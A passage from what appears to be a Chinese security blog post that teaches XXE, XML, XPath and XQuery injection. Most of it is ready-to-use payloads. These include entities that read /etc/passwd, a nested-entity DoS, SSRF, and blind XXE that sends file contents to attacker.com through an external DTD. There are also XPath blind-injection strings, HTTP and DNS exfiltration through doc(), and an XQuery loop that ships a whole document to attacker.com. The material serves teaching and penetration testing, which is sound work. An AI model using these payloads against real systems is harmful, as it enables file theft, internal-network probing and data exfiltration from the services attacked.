    <content type="html"><![CDATA[<h1 id="简介"><a href="# 简介" class="headerlink" title="简介"></a>简介</h1><p>XXE (XML External Entity, XML 外部实体)，在一个 XML 文档中，攻击者可以直接控制 DTD 中 XML 实体的定义，引用外部实体，导致 SSRF。</p><p>使用 XML 的地方有：</p><ul><li>文档格式 OOXML, ODF, PDF, RSS, DOCX…</li><li>图片格式 SVG, EXIF Headers…</li><li>配置文件</li><li>网络协议 WebDAV, CalDAV, XMLRPC, SOAP, REST, XMPP, SAML, XACML…</li></ul><p>XXE 特征：</p><ul><li>PHP: <code>simplexml_load_file</code>, <code>xml_parse</code>, <code>simplexml_load_string</code></li><li>Java: <code>DOM</code>, <code>SAX</code>, <code>JDOM</code>, <code>DOM4J</code></li><li>Python: <code>SAX</code>, <code>DOM</code>, <code>ElementTree</code></li></ul><blockquote><p>在某些 xml 解析器中，尽管禁用了外部实体，但是解析器会在 DTD 定义阶段就对 URL 进行请求，但是不会展开该实体。<br>libxml2.9.0 后默认不解析外部实体。<br>simplexml_load_file 旧版本默认解析外部实体，新版本要指定第三個参数 LIBXML_NOENT</p></blockquote><p>XXE 有以下几种利用方法（以文件读取为例）。</p><h2 id="普通实体"><a href="# 普通实体" class="headerlink" title="普通实体"></a>普通实体 </h2><p> 引用外部普通实体。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT b (<span class="keyword">#CDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="symbol">&amp;c;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：元素类型主要有 PCDATA 和 CDATA 两种，PCDATA 中的文本会被当成 XML 解析，CDATA 中的文本则不会。定义 b 为 CDATA 来避免 &amp;c; 中出现特殊字符导致 XML 解析器解析失败而报错。<br>XML 中有 5 个预定义的实体：&amp;lt;，&amp;gt;，&amp;amp;，&amp;apos; 和 &amp;quot;，分别替换 &lt; &gt; &amp; ‘ 和 “。字符实体也可以直接通过 Ascii 码使用，例如 % 的实体为 &amp;#x25;。</p></blockquote><p>当要读取的文件中存在一些复杂的字符（例如 <code>/etc/fstab</code>），可能会引起 xml 解析器报错时，可以使用参数实体拼接绕过，如下所示。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA [&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">goodies</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/fstab&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">all</span> <span class="string">&quot;% start;% goodies;% end;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参数实体外部 -DTD"><a href="# 参数实体外部 -DTD" class="headerlink" title="参数实体外部 DTD"></a>参数实体外部 DTD</h2><p>利用参数实体引用外部 DTD 文件。</p><blockquote><p>注意：参数实体只能在 DTD 中引用，不能在声明前引用，也不能在实体声明内部引用。</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT b (<span class="keyword">#CDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % c <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    % c;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="symbol">&amp;d;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 的内容如下。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY d <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="普通实体外部 -DTD"><a href="# 普通实体外部 -DTD" class="headerlink" title="普通实体外部 DTD"></a>普通实体外部 DTD</h2><p>通过普通实体引用外部 DTD 文件。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT b (<span class="keyword">#CDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="symbol">&amp;d;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 的内容如下。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY d <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h2><p>通过定义数量巨大的实体可以造成 DOS 攻击。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT a (<span class="keyword">#ANY</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY a0 <span class="string">&quot;dos&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">a1</span> <span class="string">&quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">a2</span> <span class="string">&quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;a2;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>a2 会被扩展为很多 a1，每个 a1 又会被扩展为很多 a0，这样的嵌套扩展会严重拖慢 XML 解析器的速度。</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>外部实体引用可以访问一个 URL，造成 SSRF，通过 SSRF 可以读取文件，攻击内网等。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT a (<span class="keyword">#ANY</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b <span class="keyword">SYSTEM</span> <span class="string">&quot;http://a.com/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XXE- 盲注"><a href="#XXE- 盲注" class="headerlink" title="XXE 盲注"></a>XXE 盲注 </h2><p> 无回显的情况下可以将数据通过 HTTP 发送到远程服务器。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    % remote;</span></span><br><span class="line"><span class="meta">    % send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 的内容如下。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY &amp;#x25; <span class="keyword">payload</span> <span class="string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://attacker.com/?data=% file;&#x27;&gt;&quot;</span>&gt;</span> </span><br><span class="line">% payload;</span><br></pre></td></tr></table></figure><blockquote><p>注意要将 % 实体编码为 &amp;#x25;</p></blockquote><p>攻击流程：</p><ol><li>首先展开 <code>% remote;</code>，请求远程服务器中的 <code>evil.dtd</code>。</li><li>展开 <code>evil.dtd</code> 中的 <code>% payload;</code>。</li><li>展开 <code>evil.dtd</code> 中的 <code>% send;</code>。</li><li>展开 <code>% send;</code> 中的 <code>% file;</code>，读取文件。</li><li>最后调用 <code>% send;</code>，将展开的 <code>% file;</code> 发送到远程服务器中。</li></ol><blockquote><p>在 PHP 环境下可以将数据通过 base64 编码（利用 filter）通过 url 发送到远程服务器以避免 url 坏字符。</p></blockquote><h2 id="报错注入"><a href="# 报错注入" class="headerlink" title="报错注入"></a>报错注入 </h2><p> 类似 SQL 注入的报错注入，XXE 也可以通过报错注入返回一些额外信息，如下所示。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">message</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">NUMBER</span> <span class="string">&#x27;&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    % NUMBER;</span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>a<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以下 Payload 可能也会引起 XML 解析器错误：</p><ul><li><code>&lt;!ENTITY % trick&quot;&lt;!ENTITY err SYSTEM &#39;file:///some&#39;% pay; gif&gt;&quot;&gt; % trick;</code></li><li><code>&lt;!ENTITY % trick&quot;&lt;!ENTITY :% pay;&gt;&quot;&gt; % trick;</code></li><li><code>&lt;!ENTITY % trick&quot;&lt;!ENTITY &amp;#37; err SYSTEM &#39;% pay;&#39;&gt;&quot;&gt; % trick; % err;</code></li><li><code>&lt;!ENTITY % trick&quot;&lt;!ENTITY :% pay;&gt;&quot;&gt; % trick;</code></li><li><code>&lt;!ENTITY % trick&quot;&lt;!ENTITY &amp;#37; err SYSTEM &#39;% pay;&#39;&gt;&quot;&gt; % trick; % err;</code></li><li><code>&lt;!ENTITY % trick&quot;&lt;!ENTITY &amp;#37; err SYSTEM &#39;http% pay;:/127.0.0.1/&#39;&gt;&quot;&gt; % trick; % err;</code></li><li><code>&lt;!DOCTYPE html [&lt;!ENTITY % foo SYSTEM&quot;file:///c:/boot.ini&quot;&gt; % foo;]&gt;</code></li></ul><h2 id="SOAP"><a href="#SOAP" class="headerlink" title="SOAP"></a>SOAP</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">        &lt;![CDATA [&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://x.x.x.x:22/&quot;&gt; % dtd;]&gt;&lt;xxx/&gt;]]&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="其他 -Payload"><a href="# 其他 -Payload" class="headerlink" title="其他 Payload"></a>其他 Payload</h1><h2 id="绕过"><a href="# 绕过" class="headerlink" title="绕过"></a>绕过</h2><ul><li>可以用 <code>PUBLIC</code> 代替 <code>SYSTEM</code>，二者完全等价。</li><li>修改文档编码格式，例如 <code>UTF-7</code>，<code>UTF-16</code> 等。</li></ul><p>其他绕过方法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE :. <span class="keyword">SYTEM</span> <span class="string">&quot;http://&quot;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE :_-_: <span class="keyword">SYTEM</span> <span class="string">&quot;http://&quot;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE &#123;0xdfbf&#125; <span class="keyword">SYSTEM</span> <span class="string">&quot;http://&quot;</span></span></span><br></pre></td></tr></table></figure><h2 id="XML- 注入"><a href="#XML- 注入" class="headerlink" title="XML 注入"></a>XML 注入 </h2><p> 类似 XSS 中的闭合标签 / 引号。程序将用户输入直接拼接到一个 XML 文档中时，可以通过闭合标签 / 引号的方式注入新的 XML 数据，控制 XML 文档。</p><h2 id="XPath- 注入"><a href="#XPath- 注入" class="headerlink" title="XPath 注入"></a>XPath 注入</h2><p>SQL 语言是为了从 SQL 数据库中获取数据而产生的语言，同样为了从 XML 文档中获取数据，产生了 XPath 查询语言。类似 SQL 注入，程序将用户输入直接拼接到一个 XPath 查询语句中，造成 XPath 注入，可以获取 XML 文档的数据，甚至控制 XML 文档。</p><p>例如有一个查询语句 <code>/root/users/user [username/text ()=&#39;attacker&#39; and password/text ()=&#39;yyyy&#39;]</code>，若攻击者将 <code>attacker</code> 替换为 <code>&#39; or 1=1 or &#39;&#39;=&#39;</code>，那么查询语句就变成了 <code>/root/users/user [username/text ()=&#39;&#39; or 1=1 or &#39;&#39;=&#39;&#39; and password/text ()=&#39;yyyy&#39;]</code>。该查询语句将一直返回 true，导致查询出所有的 user 信息，由于 XPath 不像 SQL 注入有很多访问控制，XPath 的注入没有太多的限制。</p><h3 id="盲注"><a href="# 盲注" class="headerlink" title="盲注"></a>盲注 </h3><h4 id="布尔盲注"><a href="# 布尔盲注" class="headerlink" title="布尔盲注"></a> 布尔盲注 </h4><p> 在无回显的情况下，XPath 也可以盲注。首先需要获取某个节点下子节点的数量。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or count (/*) = 1 or &#x27;1&#x27; = &#x27;2</span><br><span class="line">&#x27; or count (/*) = 2 or &#x27;1&#x27; = &#x27;2</span><br><span class="line">&#x27; or count (/*) = 3 or &#x27;1&#x27; = &#x27;2</span><br><span class="line">&#x27; or count (/*) = 4 or &#x27;1&#x27; = &#x27;2</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>之后爆破出该节点的名字。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or substring (name (/*[position () = 1]),1,1)=&#x27;a&#x27; or &#x27;1&#x27;=&#x27;2</span><br><span class="line">&#x27; or substring (name (/*[position () = 1]),1,1)=&#x27;b&#x27; or &#x27;1&#x27;=&#x27;2</span><br><span class="line">&#x27; or substring (name (/*[position () = 1]),1,1)=&#x27;c&#x27; or &#x27;1&#x27;=&#x27;2</span><br><span class="line">&#x27; or substring (name (/*[position () = 1]),1,1)=&#x27;d&#x27; or &#x27;1&#x27;=&#x27;2</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>利用同样的方法也可以爆破出节点的属性。</p><h4 id="HTTP- 外带"><a href="#HTTP- 外带" class="headerlink" title="HTTP 外带"></a>HTTP 外带 </h4><p> 在 XPath 2.0 中，提供一个 <code>doc</code> 函数，该函数可以从 web 服务器中请求一个 xml 文档，利用这个 HTTP 请求，可以将数据外带到 web 服务器中。下面的 payload 可以将根节点的名字外带到 web 服务器中。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or doc (concat (&quot;http://attacker.com/?data=&quot;, encode-foruri (/*[1]/name ()))) or &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure><h4 id="DNS- 外带"><a href="#DNS- 外带" class="headerlink" title="DNS 外带"></a>DNS 外带 </h4><p> 同样可以利用 DNS 外带数据，下面的 payload 可以将根节点的名字外带到 DNS 服务器中。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or doc (concat (encode-foruri (/*[1]/name ()), &#x27;.attacker.com&#x27;)) or &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure><h3 id="常用函数"><a href="# 常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><ul><li><code>count (/root/*)</code> 获取 <code>root</code> 节点下所有子节点的数量。</li><li><code>string-length (/*[1]/*[1]/name ())</code> 获取第一个节点下第一个节点的名字的长度。</li><li><code>substring (/*[1]/*[1]/name (), 1, 1)</code> 截取第一个节点下第一个节点的名字的第一个字符。</li><li><code>lower-case (&quot;A&quot;) =&quot;a&quot;</code> 用于判断 XPath 版本，此函数在 2.0 中才加入。</li><li><code>base-uri ()</code> 返回该 XML 文档文件的位置，XPath 2.0 加入。</li><li><code>/root/a/text ()</code> 获取 root 节点下 a 节点的文本内容。</li><li><code>matches (/*[1]/name (), &#39;[A-Z]+&#39;)</code>  通过正则表达式验证。</li><li><code>string-to-codepoints (&quot;abc&quot;)</code> 将字符串转换为 Ascii 码 (97, 98, 99)。</li><li><code>(if 1 then 1 else 0)</code> 条件表达式，可用于布尔盲注。</li><li><code>concat (&#39;a&#39;, &#39;b&#39;)</code> 字符串链接。</li><li><code>doc (‘http://attacker.com/a.xml’)</code> 从 web 服务器上读取一个 xml 文档，XPath 2.0 加入。此功能不是默认启用，并且 URI 若不是 xml 文档会报错。</li><li><code>encode-foruri (&#39;abc&#39;)</code> URL 编码，XPath 2.0 加入。</li></ul><h3 id="XPath- 语法速查"><a href="#XPath- 语法速查" class="headerlink" title="XPath 语法速查"></a>XPath 语法速查 </h3><p> 更多 XPath 知识，参考 <a href="https://www.w3school.com.cn/xpath/index.asp">w3school</a>。</p><h4 id="节点类型"><a href="# 节点类型" class="headerlink" title="节点类型"></a>节点类型</h4><p>XPath 中将 XML 节点分为以下几种类型：</p><ul><li><code>element</code> 元素 / 节点</li><li><code>attribute</code> 属性</li><li><code>text</code> 文本</li><li><code>namespace</code> 命名空间</li><li><code>processing-instruction</code> 处理指令</li><li><code>comment</code> 注释</li><li><code>root</code> 根节点</li></ul><h4 id="表达式"><a href="# 表达式" class="headerlink" title="表达式"></a>表达式</h4><p>XPath 通过表达式选取 XML 节点，常用表达式如下：</p><ul><li><code>nodename</code> 选取此节点的所有子节点</li><li><code>/</code> 从根节点选取</li><li><code>//</code> 从匹配选择的当前节点选择文档中的节点，不考虑它们的位置</li><li><code>.</code> 选取当前节点</li><li><code>..</code> 选取当前节点的父节点</li><li><code>@</code> 选取属性</li></ul><p>例如：</p><ul><li><code>bookstore</code> 选取 bookstore 元素所有的子节点</li><li><code>/bookstore</code> 选取根节点 bookstore</li><li><code>bookstore/book</code> 选取 bookstore 节点下所有子节点中的 book 节点</li><li><code>//book</code> 选取所有的 book 节点，不论在文档中的位置在哪</li><li><code>bookstore//book</code> 选取 bookstore 节点中所有后代节点中的 book 节点</li><li><code>//@lang</code> 选取名为 lang 的所有属性</li></ul><h4 id="限定语"><a href="# 限定语" class="headerlink" title="限定语"></a>限定语 </h4><p> 通过限定语可以选取某个具体的节点，限定语跟在节点后，包裹在方括号中，例如：</p><ul><li><code>/bookstore/book [1]</code> 选取属于 bookstore 子节点中的第一个 book 节点</li><li><code>/bookstore/book [last ()]</code> 选取属于 bookstore 子节点中的最后一个 book 节点</li><li><code>//title [@lang]</code> 选取所有拥有名为 lang 的属性的 title 节点</li><li><code>//title [@lang=&#39;eng&#39;]</code> 选取所有 title 节点，且这些节点拥有值为 eng 的 lang 属性</li><li><code>/bookstore/book [price&gt;3.500]/title</code> 选取 bookstore 节点中的 book 节点的所有 title 节点，且其中的 price 节点的值须大于 35.00</li></ul><h4 id="通配符"><a href="# 通配符" class="headerlink" title="通配符"></a>通配符</h4><p>XPath 支持部分通配符选择元素：</p><ul><li><code>*</code> 匹配任意节点</li><li><code>@*</code> 匹配任意属性节点</li></ul><p>例如：</p><ul><li><code>/bookstore/*</code> 选择 bookstore 节点下的所有子节点</li><li><code>//*</code> 选择文档中所有节点</li><li><code>//title [@*]</code> 选择所有带有属性的节点</li></ul><h4 id="多路径查询"><a href="# 多路径查询" class="headerlink" title="多路径查询"></a>多路径查询</h4><p>XPath 支持使用 <code>|</code> 进行多路径查询，例如：</p><ul><li><code>//book/title | //book/price</code> 选择 book 节点下的所有 title 和 price 节点</li><li><code>bookstore/book/title | //price</code> 选择属于 bookstore 节点的 book 节点下的所有 title 节点以及文档中所有 price 节点</li></ul><h2 id="XQuery- 注入"><a href="#XQuery- 注入" class="headerlink" title="XQuery 注入"></a>XQuery 注入</h2><p>XQuery 是 XPath 的超集，XQuery 可以赋予 XPath 逻辑编程能力，例如下面的代码会遍历每一个从 <code>users</code> 中查询出的节点，并且返回该节点下的 <code>username</code> 节点。</p><figure class="highlight xpath"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">$user</span> <span class="keyword">in</span> //users [@role=<span class="string">&#x27;admin&#x27;</span>] <span class="keyword">return</span> <span class="variable">$user</span>/username</span><br></pre></td></tr></table></figure><p>若上述查询中，<code>admin</code> 字符串可控，那么就可以注入 XPath 查询甚至 XQuery 代码，下面的代码利用 <code>doc</code>，循环便利整个 xml 文档，将所有整个文档发送到攻击者的服务器中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> $n <span class="keyword">in</span> /*[<span class="number">1</span>]/*</span><br><span class="line">    let $x := <span class="keyword">for</span> $att <span class="keyword">in</span> $n/@* <span class="keyword">return</span>(concat (name ($att), <span class="string">&quot;=&quot;</span>, encode-<span class="keyword">for</span>-uri ($att)))</span><br><span class="line">    let $y := doc (concat (</span><br><span class="line">        <span class="string">&quot;http://attacker.com/?name=&quot;</span>, encode-<span class="keyword">for</span>-uri (name ($n)), </span><br><span class="line">        <span class="string">&quot;&amp;amp;data=&quot;</span>, encode-<span class="keyword">for</span>-uri ($n/text ()),</span><br><span class="line">        <span class="string">&quot;&amp;amp;attr_&quot;</span>, string-join ($x,<span class="string">&quot;&amp;amp;attr_&quot;</span>)</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> $c <span class="keyword">in</span> $n/child::*</span><br><span class="line">        let $x := <span class="keyword">for</span> $att <span class="keyword">in</span> $c/@* <span class="keyword">return</span>(concat (name ($c), <span class="string">&quot;=&quot;</span>, encode-<span class="keyword">for</span>-uri ($c)))</span><br><span class="line">        let $y := doc (concat (</span><br><span class="line">            <span class="string">&quot;http://attacker.com/?child=1&amp;amp;name=&quot;</span>, encode-<span class="keyword">for</span>-uri (name ($c)),</span><br><span class="line">            <span class="string">&quot;&amp;amp;data=&quot;</span>, encode-<span class="keyword">for</span>-uri ($c/text ()),</span><br><span class="line">            <span class="string">&quot;&amp;amp;attr_&quot;</span>, string-join ($x,<span class="string">&quot;&amp;amp;attr_&quot;</span>)</span><br><span class="line">        )) </span><br></pre></td></tr></table></figure><p>Exist-DB 是一个类似 SQLite 的本地 xml 数据库，可以通过 XQuery 进行查询。不同于其他数据库，Exist-DB 使用 HTTP 接口进行查询，例如 REST, XML-RPC, WebDAV 和 SOAP。更多 XQuery 知识，参考 <a 